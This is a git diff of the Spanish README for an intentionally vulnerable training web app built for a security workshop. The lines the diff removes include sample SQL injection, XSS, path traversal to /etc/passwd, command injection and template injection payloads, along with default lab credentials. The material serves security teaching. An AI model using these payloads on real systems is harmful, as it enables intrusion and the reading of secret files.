@@ -12,7 +12,7 @@ Esta es una aplicación de práctica diseñada específicamente con fines educat
 
 ```bash
 # Clonar el repositorio
-git clone https://github.com/your-repo/hackconrd-web-workshop.git
+git clone https://github.com/ndivilight/hackconrd-web-workshop.git
 cd hackconrd-web-workshop
 
 # Construir e iniciar
@@ -20,32 +20,35 @@ docker-compose up --build
 
 # Acceder en: http://localhost:8080
 ```
+---
 
-### Sin Docker
+## Comandos Utiles
 
 ```bash
-# Crear entorno virtual
-python3 -m venv venv
-source venv/bin/activate  # Linux/Mac
-# o: venv\Scripts\activate  # Windows
+# Reiniciar la base de datos
+cd hackconrd-web-workshop
+docker-compose down
+rm -f data/portal.db
+docker-compose up --build
 
-# Instalar dependencias
-pip install -r requirements.txt
+# Ver logs 
+cd hackconrd-web-workshop
+docker-compose logs -f
 
-# Inicializar base de datos
-python scripts/init_db.py
+# Acceder al contenedor
+cd hackconrd-web-workshop
+docker exec -it techcorp-portal /bin/bash
 
-# Ejecutar aplicacion
-python run.py
-
-# Acceder en: http://localhost:5000
+# Detener
+cd hackconrd-web-workshop
+docker-compose down
 ```
 
 ---
 
 ## Credenciales por Defecto
 
-| Usuario | Contrasena | Rol |
+| Usuario | Contraseña | Rol |
 |---------|------------|-----|
 | `admin` | `admin123` | Administrador |
 | `jsmith` | `password123` | Empleado |
@@ -55,7 +58,7 @@ python run.py
 
 ## Objetivos del Taller
 
-El laboratorio esta estructurado para cubrir los vectores de ataque mas comunes del OWASP Top 10:
+El laboratorio está estructurado para cubrir los vectores de ataque mas comunes del OWASP Top 10:
 
 | # | Vulnerabilidad | Ubicacion | Dificultad |
 |---|----------------|-----------|------------|
@@ -102,127 +105,15 @@ hackconrd-web-workshop/
 
 ## Sistema de Dificultad
 
-La aplicacion incluye tres niveles de dificultad que controlan la cantidad de pistas:
+La aplicación incluye tres niveles de dificultad que controlan la cantidad de pistas:
 
-| Nivel | Descripcion |
+| Nivel | Descripción |
 |-------|-------------|
 | **Easy** | Pistas en HTML, mensajes de error verbosos, payloads sugeridos |
 | **Medium** | Pistas sutiles en comentarios, algunos errores |
-| **Hard** | Sin pistas, errores genericos, comportamiento realista |
+| **Hard** | Sin pistas, errores genéricos, comportamiento realista |
 
-Cambiar dificultad: Click en el menu de dificultad en la barra de navegacion.
-
----
-
-## Guia de Vulnerabilidades
-
-### 1. SQL Injection (SQLi)
-
-**Ubicacion:** `/auth/login`, `/employees/search`
-
-**Payloads de ejemplo:**
-```
-# Login bypass
-Username: admin'--
-Username: ' OR '1'='1
-
-# Union-based (Search)
-' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--
-' UNION SELECT id,username,password,role,null,null,null,null,null,null,null FROM users--
-```
-
-### 2. Cross-Site Scripting (XSS)
-
-**Ubicacion:** `/announcements/new`, `/announcements/search`
-
-**Payloads:**
-```html
-<!-- Stored XSS -->
-<script>alert('XSS')</script>
-<img src=x onerror="alert('XSS')">
-<svg onload="alert('XSS')">
-
-<!-- DOM-based (en URL) -->
-?message=<script>alert('XSS')</script>
-```
-
-### 3. IDOR (Insecure Direct Object Reference)
-
-**Ubicacion:** `/employees/<id>`, `/employees/<id>/payslip`
-
-**Explotacion:**
-- Acceder a `/employees/1/payslip`, `/employees/2/payslip`, etc.
-- No hay verificacion de autorizacion
-
-### 4. Directory Traversal
-
-**Ubicacion:** `/documents/download?file=`
-
-**Payloads:**
-```
-../../../etc/passwd
-....//....//....//etc/passwd
-../app/config.py
-../../../flag.txt
-```
-
-### 5. Command Injection
-
-**Ubicacion:** `/tools/ping`, `/tools/nslookup`
-
-**Payloads:**
-```
-127.0.0.1; whoami
-google.com | cat /etc/passwd
-`id`
-$(cat /etc/passwd)
-127.0.0.1 && ls -la /
-```
-
-### 6. Server-Side Template Injection (SSTI)
-
-**Ubicacion:** `/reports/generate`
-
-**Payloads:**
-```jinja2
-{{ 7*7 }}
-{{ config }}
-{{ config.SECRET_KEY }}
-{{ ''.__class__.__mro__[1].__subclasses__() }}
-```
-
-### 7. JWT Vulnerabilities
-
-**Ubicacion:** `/api/auth/token`, `/api/*`
-
-**Vulnerabilidades:**
-- Clave secreta debil: `jwt-secret-key`
-- Algoritmo `none` aceptado
-- Sin verificacion de expiracion
-
----
-
-## API Endpoints
-
-| Endpoint | Metodo | Descripcion |
-|----------|--------|-------------|
-| `/api/auth/token` | POST | Obtener JWT token |
-| `/api/employees` | GET | Listar empleados |
-| `/api/employees/<id>` | GET | Detalles de empleado |
-| `/api/tools/ping` | POST | Ping via API |
-| `/api/debug` | GET | Informacion sensible |
-
-**Ejemplo de uso:**
-```bash
-# Obtener token
-curl -X POST http://localhost:8080/api/auth/token \
-  -H "Content-Type: application/json" \
-  -d '{"username":"admin","password":"admin123"}'
-
-# Usar token
-curl http://localhost:8080/api/employees \
-  -H "Authorization: Bearer <TOKEN>"
-```
+Cambiar dificultad: Click en el menu de dificultad en la barra de navegación.
 
 ---
 
@@ -235,26 +126,6 @@ curl http://localhost:8080/api/employees \
 | **cURL** | Peticiones HTTP desde terminal |
 | **sqlmap** | Automatizacion de SQL Injection |
 | **jwt_tool** | Analisis y explotacion de JWT |
-
----
-
-## Comandos Utiles
-
-```bash
-# Reiniciar la base de datos
-docker-compose down
-rm -f data/portal.db
-docker-compose up --build
-
-# Ver logs
-docker-compose logs -f
-
-# Acceder al contenedor
-docker exec -it techcorp-portal /bin/bash
-
-# Detener
-docker-compose down
-```
 
 ---
 
@@ -275,4 +146,4 @@ docker-compose down
 
 ## Licencia
 
-Este proyecto es solo para fines educativos. Uselo responsablemente.
+Este proyecto es solo para fines educativos. Úselo responsablemente.
